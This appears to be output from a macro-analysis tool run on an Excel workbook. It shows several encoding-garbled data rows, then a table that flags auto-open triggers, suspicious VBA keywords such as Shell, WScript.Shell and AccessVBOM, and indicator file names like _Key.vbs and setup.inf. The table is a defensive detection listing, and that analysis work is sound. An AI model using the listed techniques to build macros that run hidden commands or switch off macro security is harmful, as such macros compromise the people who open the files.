' ½­Òõ¿â´æ,E4573,"",1.43599999999999994316
' ½­Òõ¿â´æ,E4574,"",1.42900000000000004796
' ½­Òõ¿â´æ,E4575,"",1.41300000000000003375
' ½­Òõ¿â´æ,E4581,"",1.50699999999999989519
' ½­Òõ¿â´æ,E4582,"",1.01299999999999990052
' ½­Òõ¿â´æ,E4583,"",2.44899999999999984368
' ½­Òõ¿â´æ,E4584,"",1.01299999999999990052
' ½­Òõ¿â´æ,E4585,"",1.49199999999999999289
' ½­Òõ¿â´æ,E4587,"",1.65799999999999991829
' ½­Òõ¿â´æ,E4589,"",2.70400000000000018119
' ½­Òõ¿â´æ,E4590,"",4.23899999999999987921
' ½­Òõ¿â´æ,E4592,"",8.72899999999999920419
' ½­Òõ¿â´æ,E4593,"",7.57300000000000039790
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|shell.application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|sendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |OUTLOOK.EXE         |Executable file name                         |
|IOC       |_clear.vbs          |Executable file name                         |
|IOC       |_Search.vbs         |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |_Key.vbs            |Executable file name                         |
|IOC       |setup.inf           |Executable file name                         |
|IOC       |_key.vbs            |Executable file name                         |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+

